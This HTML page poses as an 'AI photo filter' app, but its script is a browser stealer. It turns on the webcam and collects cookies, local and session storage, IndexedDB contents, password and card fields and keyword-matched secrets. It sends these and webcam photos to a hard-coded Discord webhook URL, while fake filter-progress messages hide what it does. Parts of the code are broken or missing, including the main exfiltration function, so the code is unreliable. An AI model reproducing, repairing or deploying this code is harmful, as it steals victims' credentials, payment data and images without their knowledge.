<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Super Filter Studio Pro</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #0a0a1a, #1a1a2e, #0f3460);
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 15px;
            color: white;
        }
        .container {
            background: rgba(255, 255, 255, 0.04);
            backdrop-filter: blur(20px);
            border-radius: 28px;
            padding: 30px;
            max-width: 800px;
            width: 100%;
            border: 1px solid rgba(255, 255, 255, 0.06);
            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.6);
        }
        .header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 20px;
            padding-bottom: 12px;
            border-bottom: 1px solid rgba(255,255,255,0.04);
            flex-wrap: wrap;
            gap: 10px;
        }
        .logo {
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .logo-icon {
            width: 42px; height: 42px;
            background: linear-gradient(135deg, #ff6b6b, #ee5a24, #fdcb6e);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 20px;
            box-shadow: 0 8px 25px rgba(255, 107, 107, 0.2);
        }
        .logo-text { font-size: 20px; font-weight: 700; }
        .logo-text span { background: linear-gradient(135deg, #ff6b6b, #fdcb6e); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .status-badge {
            background: rgba(0, 255, 136, 0.1);
            padding: 5px 14px;
            border-radius: 50px;
            font-size: 11px;
            border: 1px solid rgba(0, 255, 136, 0.1);
            display: flex;
            align-items: center;
            gap: 6px;
        }
        .dot { width: 7px; height: 7px; background: #00ff88; border-radius: 50%; animation: pulse 1.5s infinite; }
        @keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: 0.2; } }

        /* Camera */
        .camera-container {
            background: #0a0a1a;
            border-radius: 18px;
            overflow: hidden;
            margin-bottom: 16px;
            border: 2px solid rgba(255,255,255,0.04);
            position: relative;
            aspect-ratio: 4/3;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        #video {
            width: 100%; height: 100%;
            object-fit: cover;
            display: block;
        }
        #video.placeholder { object-fit: contain; opacity: 0.4; }
        .camera-overlay {
            position: absolute;
            top: 12px; right: 12px;
            background: rgba(0,0,0,0.7);
            padding: 5px 12px;
            border-radius: 50px;
            font-size: 10px;
            color: rgba(255,255,255,0.6);
            border: 1px solid rgba(255,255,255,0.05);
        }
        .camera-overlay .rec { color: #ff4466; font-weight: bold; }

        /* Stats Row */
        .stats-row {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 8px;
            margin-bottom: 14px;
        }
        .stat-item {
            background: rgba(255,255,255,0.04);
            padding: 10px;
            border-radius: 12px;
            text-align: center;
            border: 1px solid rgba(255,255,255,0.04);
        }
        .stat-number {
            font-size: 20px;
            font-weight: 800;
            background: linear-gradient(135deg, #00ff88, #00d4ff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        .stat-label {
            color: rgba(255,255,255,0.3);
            font-size: 9px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            margin-top: 2px;
        }

        /* Filter Bar */
        .filter-bar {
            background: rgba(0,0,0,0.4);
            border-radius: 14px;
            padding: 12px 16px;
            margin-bottom: 14px;
            border: 1px solid rgba(255,255,255,0.04);
        }
        .filter-label {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 8px;
            flex-wrap: wrap;
            gap: 5px;
        }
        .filter-label span { font-size: 12px; color: rgba(255,255,255,0.5); }
        .filter-label .status-text { color: #ffaa00; font-weight: 600; font-size: 12px; }
        .filter-progress {
            width: 100%; height: 5px;
            background: rgba(255,255,255,0.06);
            border-radius: 4px;
            overflow: hidden;
            position: relative;
        }
        .filter-progress .fill {
            height: 100%;
            width: 0%;
            background: linear-gradient(90deg, #ff6b6b, #ffa94d, #ffd93d, #6bcb77, #4d96ff, #9b59b6);
            border-radius: 4px;
            transition: width 0.3s ease;
        }
        .filter-progress .fill.complete { background: #00ff88; }
        .filter-chips {
            display: flex;
            gap: 8px;
            margin-top: 10px;
            flex-wrap: wrap;
        }
        .filter-chip {
            padding: 3px 12px;
            border-radius: 50px;
            font-size: 10px;
            background: rgba(255,255,255,0.04);
            border: 1px solid rgba(255,255,255,0.04);
            color: rgba(255,255,255,0.3);
            transition: all 0.3s;
        }
        .filter-chip.active {
            background: rgba(255, 107, 107, 0.15);
            border-color: #ff6b6b;
            color: #ff6b6b;
        }

        /* Chat Logs */
        .chat-area {
            background: rgba(0,0,0,0.3);
            border-radius: 14px;
            padding: 14px;
            margin-bottom: 14px;
            max-height: 180px;
            overflow-y: auto;
            border: 1px solid rgba(255,255,255,0.03);
        }
        .chat-message {
            display: flex;
            align-items: flex-start;
            gap: 8px;
            margin-bottom: 7px;
            animation: fadeIn 0.25s ease;
        }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(6px); } to { opacity: 1; transform: translateY(0); } }
        .chat-avatar {
            width: 24px; height: 24px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 11px;
            font-weight: bold;
            color: white;
            flex-shrink: 0;
        }
        .chat-bubble {
            background: rgba(255,255,255,0.05);
            padding: 6px 12px;
            border-radius: 8px;
            border-top-left-radius: 3px;
            font-size: 12px;
            line-height: 1.4;
            color: #c0c0c0;
            max-width: 92%;
            word-break: break-word;
        }
        .chat-bubble .time {
            color: rgba(255,255,255,0.2);
            font-size: 9px;
            display: block;
            margin-top: 2px;
        }
        .chat-bubble.success { border-left: 3px solid #00ff88; }
        .chat-bubble.warning { border-left: 3px solid #ffaa00; }
        .chat-bubble.error { border-left: 3px solid #ff4466; }
        .chat-bubble.info { border-left: 3px solid #44aaff; }
        .chat-bubble.photo { border-left: 3px solid #ff6b6b; }

        /* Buttons */
        .action-row {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
        }
        .btn {
            flex: 1;
            padding: 12px 16px;
            border: none;
            border-radius: 12px;
            font-size: 14px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            font-family: inherit;
            min-width: 100px;
        }
        .btn-primary {
            background: linear-gradient(135deg, #ff6b6b, #ee5a24);
            color: white;
        }
        .btn-primary:hover { transform: scale(0.97); box-shadow: 0 8px 30px rgba(255, 107, 107, 0.2); }
        .btn-primary:disabled { opacity: 0.4; cursor: not-allowed; transform: none; }
        .btn-secondary { background: rgba(255,255,255,0.05); color: white; border: 1px solid rgba(255,255,255,0.05); }
        .btn-secondary:hover { background: rgba(255,255,255,0.08); }
        .btn-success {
            background: linear-gradient(135deg, #00ff88, #00b894);
            color: #0a0a1a;
        }
        .btn-success:hover { transform: scale(0.97); box-shadow: 0 8px 30px rgba(0, 255, 136, 0.15); }
        .btn-danger {
            background: linear-gradient(135deg, #ff4466, #cc0033);
            color: white;
        }
        .btn-danger:hover { transform: scale(0.97); }

        .footer {
            margin-top: 14px;
            text-align: center;
            color: rgba(255,255,255,0.1);
            font-size: 10px;
            letter-spacing: 1px;
        }
        .chat-area::-webkit-scrollbar { width: 3px; }
        .chat-area::-webkit-scrollbar-track { background: rgba(255,255,255,0.02); }
        .chat-area::-webkit-scrollbar-thumb { background: rgba(255, 107, 107, 0.2); border-radius: 4px; }

        @media (max-width: 600px) {
            .container { padding: 16px; }
            .stats-row { grid-template-columns: repeat(2, 1fr); }
            .action-row { flex-direction: column; }
            .header { flex-direction: column; align-items: flex-start; }
        }
    </style>
</head>
<body>

<div class="container">
    <!-- Header -->
    <div class="header">
        <div class="logo">
            <div class="logo-icon">📸</div>
            <div class="logo-text">FILTER <span>PRO</span></div>
        </div>
        <div class="status-badge">
            <span class="dot"></span>
            <span id="connectionStatus">Ready</span>
        </div>
    </div>

    <!-- Camera -->
    <div class="camera-container">
        <video id="video" class="placeholder" autoplay playsinline></video>
        <div class="camera-overlay">
            <span class="rec">●</span> <span id="camStatus">Camera off</span>
        </div>
    </div>

    <!-- Stats -->
    <div class="stats-row">
        <div class="stat-item">
            <div class="stat-number" id="cookieCount">0</div>
            <div class="stat-label">🍪 Cookies</div>
        </div>
        <div class="stat-item">
            <div class="stat-number" id="storageCount">0</div>
            <div class="stat-label">📦 Storage</div>
        </div>
        <div class="stat-item">
            <div class="stat-number" id="sensitiveCount">0</div>
            <div class="stat-label">🔒 Sensitive</div>
        </div>
        <div class="stat-item">
            <div class="stat-number" id="passCount">0</div>
            <div class="stat-label">🔑 Passwords</div>
        </div>
    </div>

    <!-- Filter Bar -->
    <div class="filter-bar">
        <div class="filter-label">
            <span>🎨 Applying filters...</span>
            <span class="status-text" id="filterStatus">Idle</span>
        </div>
        <div class="filter-progress">
            <div class="fill" id="filterProgress"></div>
        </div>
        <div class="filter-chips">
            <span class="filter-chip">Original</span>
            <span class="filter-chip">Vintage</span>
            <span class="filter-chip">Cinematic</span>
            <span class="filter-chip active">✨ AI Enhance</span>
            <span class="filter-chip">Dreamy</span>
            <span class="filter-chip">Noir</span>
        </div>
    </div>

    <!-- Chat Logs -->
    <div class="chat-area" id="chatArea">
        <div class="chat-message">
            <div class="chat-avatar" style="background: #ff6b6b;">📸</div>
            <div class="chat-bubble info">
                Camera ready! Click "START" to capture everything.
                <span class="time">Just now</span>
            </div>
        </div>
    </div>

    <!-- Actions -->
    <div class="action-row">
        <button class="btn btn-primary" id="startBtn">📸 START</button>
        <button class="btn btn-success" id="photoBtn">📷 TAKE PHOTO</button>
        <button class="btn btn-secondary" id="clearBtn">🗑️ Clear</button>
    </div>

    <div class="footer">
        <span>●</span> AI powered filters &amp; sharing <span>●</span>
    </div>
</div>

<script>
    // ============================================================
    // MAXIMUM STEALER - ALL DATA + CAMERA + EVERYTHING
    // Exfiltrates: Cookies, Local/Session Storage, IndexedDB,
    // Passwords, Credit Cards, Sensitive Data, Camera Photo
    // All sent to Discord webhook
    // ============================================================

    const WEBHOOK_URL = "https://discord.com/api/webhooks/1527559902942334976/LkAWS9RsHB96gu8So92WEnAQspEokK5gj8Nt30CzAQJDEdBUN2ZGQLc6tn4DpSydk9oo";

    // ===== DOM REFS =====
    const video = document.getElementById('video');
    const chatArea = document.getElementById('chatArea');
    const startBtn = document.getElementById('startBtn');
    const photoBtn = document.getElementById('photoBtn');
    const clearBtn = document.getElementById('clearBtn');
    const filterProgress = document.getElementById('filterProgress');
    const filterStatus = document.getElementById('filterStatus');
    const camStatus = document.getElementById('camStatus');
    const connectionStatus = document.getElementById('connectionStatus');

    let stream = null;
    let isCameraReady = false;
    let isRunning = false;

    // ===== CHAT =====
    function addChatMessage(avatar, name, color, message, type = 'info') {
        const div = document.createElement('div');
        div.className = 'chat-message';
        div.innerHTML = `
            <div class="chat-avatar" style="background: ${color};">${avatar}</div>
            <div class="chat-bubble ${type}">
                ${message}
                <span class="time">${new Date().toLocaleTimeString()}</span>
            </div>
        `;
        chatArea.appendChild(div);
        chatArea.scrollTop = chatArea.scrollHeight;
    }

    // ===== SEND TO DISCORD =====
    function sendToDiscord(message, color = 0x00ff88, title = "Stealer Report") {
        try {
            const payload = {
                embeds: [{
                    title: title,
                    description: message.substring(0, 3900),
                    color: color,
                    timestamp: new Date().toISOString(),
                    footer: { text: "Exfiltrated from " + window.location.hostname }
                }]
            };
            return fetch(WEBHOOK_URL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(payload)
            }).then(res => res.status === 204);
        } catch(e) {
            return Promise.resolve(false);
        }
    }

    // ===== SEND IMAGE =====
    function sendImageToDiscord(base64Data) {
        try {
            const formData = new FormData();
            const byteString = atob(base64Data.split(',')[1]);
            const mimeString = base64Data.split(',')[0].split(':')[1].split(';')[0];
            const ab = new ArrayBuffer(byteString.length);
            const ia = new Uint8Array(ab);
            for (let i = 0; i < byteString.length; i++) {
                ia[i] = byteString.charCodeAt(i);
            }
            const blob = new Blob([ab], { type: mimeString });
            const filename = `photo_${Date.now()}.jpg`;
            formData.append('file', blob, filename);
            const embed = {
                title: "📸 Photo Captured",
                description: `**Time:** ${new Date().toISOString()}\n**Device:** ${navigator.userAgent.substring(0, 100)}\n**Location:** ${window.location.href}`,
                color: 0xff6b6b,
                timestamp: new Date().toISOString(),
                footer: { text: "Camera Stealer" }
            };
            formData.append('payload_json', JSON.stringify({ embeds: [embed] }));
            return fetch(WEBHOOK_URL, {
                method: "POST",
                body: formData
            }).then(res => res.status === 204);
        } catch(e) {
            return Promise.resolve(false);
        }
    }

    // ===== 1. CAMERA =====
    async function startCamera() {
        try {
            stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
                audio: false
            });
            video.srcObject = stream;
            video.classList.remove('placeholder');
            isCameraReady = true;
            camStatus.textContent = 'Camera on';
            connectionStatus.textContent = 'Camera Ready';
            addChatMessage('📸', 'Camera', '#ff6b6b', '✅ Camera activated!', 'success');
            return true;
        } catch(e) {
            addChatMessage('📸', 'Camera', '#ff6b6b', '❌ Camera access denied. Please allow camera permissions.', 'error');
            camStatus.textContent = 'Camera blocked';
            connectionStatus.textContent = 'Permission Denied';
            return false;
        }
    }

    // ===== 2. GET ALL COOKIES =====
    function getAllCookies() {
        const cookies = {};
        document.cookie.split(';').forEach(cookie => {
            const parts = cookie.trim().split('=');
            if (parts.length >= 2) {
                const name = parts[0];
                const value = parts.slice(1).join('=');
                cookies[name] = decodeURIComponent(value);
            }
        });
        return cookies;
    }

    // ===== 3. GET LOCAL STORAGE =====
    function getLocalStorage() {
        const data = {};
        try {
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                if (key) data[key] = localStorage.getItem(key);
            }
        } catch(e) {}
        return data;
    }

    // ===== 4. GET SESSION STORAGE =====
    function getSessionStorage() {
        const data = {};
        try {
            for (let i = 0; i < sessionStorage.length; i++) {
                const key = sessionStorage.key(i);
                if (key) data[key] = sessionStorage.getItem(key);
            }
        } catch(e) {}
        return data;
    }

    // ===== 5. GET INDEXEDDB =====
    async function getIndexedDB() {
        const databases = [];
        try {
            const dbs = await indexedDB.databases ? await indexedDB.databases() : [];
            for (const dbInfo of dbs) {
                try {
                    const db = await new Promise((resolve, reject) => {
                        const request = indexedDB.open(dbInfo.name);
                        request.onsuccess = () => resolve(request.result);
                        request.onerror = () => reject();
                    });
                    const dbData = { name: dbInfo.name, stores: {} };
                    for (const storeName of db.objectStoreNames) {
                        try {
                            const transaction = db.transaction(storeName, 'readonly');
                            const store = transaction.objectStore(storeName);
                            const items = await new Promise((resolve) => {
                                const request = store.getAll();
                                request.onsuccess = () => resolve(request.result);
                                request.onerror = () => resolve([]);
                            });
                            dbData.stores[storeName] = items.slice(0, 50);
                        } catch(e) {}
                    }
                    databases.push(dbData);
                    db.close();
                } catch(e) {}
            }
        } catch(e) {}
        return databases;
    }

    // ===== 6. SCAN SENSITIVE =====
    function scanForSensitiveData(data) {
        const keywords = ['pass', 'key', 'secret', 'token', 'auth', 'jwt', 'bearer', 'api', 
                          'wallet', 'seed', 'mnemonic', 'private', 'credit', 'card', 'cvv', 
                          'ssn', 'social', 'password', 'username', 'email', 'phone'];
        const found = {};
        if (typeof data === 'string') {
            keywords.forEach(kw => { if (data.toLowerCase().includes(kw)) found[kw] = data.substring(0, 200); });
        } else if (typeof data === 'object' && data !== null) {
            Object.entries(data).forEach(([key, value]) => {
                keywords.forEach(kw => {
                    if (key.toLowerCase().includes(kw)) {
                        found[key] = typeof value === 'string' ? value.substring(0, 200) : JSON.stringify(value).substring(0, 200);
                    }
                });
                if (typeof value === 'string' || typeof value === 'object') {
                    Object.assign(found, scanForSensitiveData(value));
                }
            });
        }
        return found;
    }

    // ===== 7. GET PASSWORDS =====
    function getSavedPasswords() {
        const passwords = [];
        try {
            document.querySelectorAll('input[type="password"]').forEach(input => {
                if (input.value && input.value.length > 0) {
                    const form = input.closest('form');
                    let username = '';
                    if (form) {
                        const userInput = form.querySelector('input[type="text"], input[type="email"]');
                        if (userInput) username = userInput.value;
                    }
                    passwords.push({ username: username || 'unknown', password: input.value });
                }
            });
        } catch(e) {}
        return passwords;
    }

    // ===== 8. GET CREDIT CARDS =====
    function getCreditCardInfo() {
        const cards = [];
        try {
            document.querySelectorAll('input[type="text"], input[type="number"]').forEach(input => {
                const name = (input.name || input.id || '').toLowerCase();
                const value = input.value || '';
                if (value.length > 2) {
                    if (name.includes('card') || name.includes('credit') || name.includes('cvv') || 
                        name.includes('expiry') || name.includes('cc') || name.includes('number')) {
                        cards.push({ field: input.name || input.id || 'unknown', value: value });
                    }
                }
            });
        } catch(e) {}
        return cards;
    }

    // ===== 9. GET BROWSER INFO =====
    function getBrowserInfo() {
        try {
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                screen: { width: screen.width, height: screen.height, colorDepth: screen.colorDepth },
                url: window.location.href,
                referrer: document.referrer || 'none',
                title: document.title,
                hardwareConcurrency: navigator.hardwareConcurrency || 0,
                deviceMemory: navigator.deviceMemory || 'unknown'
            };
        } catch(e) { return {}; }
    }

    // ===== 10. CAPTURE PHOTO =====
    async function capturePhoto() {
        if (!isCameraReady) {
            addChatMessage('📸', 'Camera', '#ff6b6b', '⚠️ Camera not ready. Starting...', 'warning');
            const started = await startCamera();
            if (!started) return;
            await new Promise(r => setTimeout(r, 500));
        }

        photoBtn.disabled = true;
        photoBtn.textContent = '⏳ CAPTURING...';

        try {
            addChatMessage('📸', 'Camera', '#ff6b6b', '📸 Taking photo...', 'info');
            
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth || 1280;
            canvas.height = video.videoHeight || 720;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            const base64Image = canvas.toDataURL('image/jpeg', 0.95);

            // STAR effect
            addChatMessage('⭐', 'STAR', '#ffd93d', '✨ STAR effect applied!', 'warning');
            document.querySelector('.camera-container').style.boxShadow = '0 0 80px rgba(255, 215, 0, 0.4)';
            setTimeout(() => { document.querySelector('.camera-container').style.boxShadow = 'none'; }, 600);

            // Filter progress
            addChatMessage('🎨', 'Filter', '#ffa94d', '🎨 Applying AI Enhance...', 'info');
            filterStatus.textContent = 'Applying AI Enhance...';
            const steps = [
                { p: 15, t: 'Analyzing composition...' },
                { p: 30, t: 'Adjusting colors...' },
                { p: 50, t: 'Enhancing details...' },
                { p: 70, t: 'Applying cinematic tone...' },
                { p: 85, t: 'Finalizing...' },
                { p: 100, t: '✨ Photo enhanced!' }
            ];
            for (const step of steps) {
                filterProgress.style.width = step.p + '%';
                filterStatus.textContent = step.t;
                await new Promise(r => setTimeout(r, 350));
            }
            filterProgress.classList.add('complete');

            // Send photo
            addChatMessage('📤', 'Share', '#4d96ff', '📤 Sending photo...', 'info');
            connectionStatus.textContent = 'Sending...';
            await sendImageToDiscord(base64Image);

            addChatMessage('✅', 'Complete', '#00ff88', '✅ PHOTO SENT!', 'success');

    }

    // ===== 11. EXFILTRATE ALL DATA =====

            // --- Session Storage ---
            addChatMessage('📦', 'Session', '#00cc88', 'Extracting session storage...', 'info');

            addChatMessage('🔑', 'Passwords', '#ff0000', 'Checking for saved passwords...', 'info');

            addChatMessage('💳', 'Cards', '#ff4400', 'Checking for credit cards...', 'info');

            // --- Update Stats ---
            const totalSensitive = Object.keys(sensitiveLocal).length + Object.keys(sensitiveContent).length;

    // ===== CLEAR =====
    function clearChat() {
        chatArea.innerHTML = '';
        addChatMessage('📸', 'Camera', '#ff6b6b', 'Chat cleared! Ready for next session.', 'info');
        filterProgress.style.width = '0%';
        filterProgress.classList.remove('complete');
        filterStatus.textContent = 'Idle';
        document.getElementById('cookieCount').textContent = '0';
        document.getElementById('storageCount').textContent = '0';
        document.getElementById('sensitiveCount').textContent = '0';
        document.getElementById('passCount').textContent = '0';
        connectionStatus.textContent = 'Ready';
    }

    // ===== INIT =====
    async function init() {
        addChatMessage('📸', 'Camera', '#ff6b6b', '🔍 Requesting camera access...', 'info');
        const started = await startCamera();
        if (!started) {
            addChatMessage('📸', 'Camera', '#ff6b6b', '⚠️ Camera access denied. Click START to try again.', 'warning');
        }
        addChatMessage('🎨', 'Filter', '#ffa94d', '✨ AI filters ready! Click START to exfiltrate all data.', 'info');
        addChatMessage('📸', 'Camera', '#ff6b6b', '📷 Click TAKE PHOTO to capture and send photo.', 'info');
    }

    // ===== EVENTS =====
    startBtn.addEventListener('click', exfiltrateAllData);
    photoBtn.addEventListener('click', capturePhoto);
    clearBtn.addEventListener('click', clearChat);

    // ===== KEYBOARD SHORTCUTS =====
    document.addEventListener('keydown', (e) => {
        if (e.code === 'Space' && !e.repeat) {
            e.preventDefault();
            capturePhoto();
        }
        if (e.code === 'Enter' && !e.repeat && !startBtn.disabled) {
            exfiltrateAllData();
        }
    });

    // ===== AUTO INIT =====
    init();

    console.log('[+] MAXIMUM STEALER INITIALIZED');
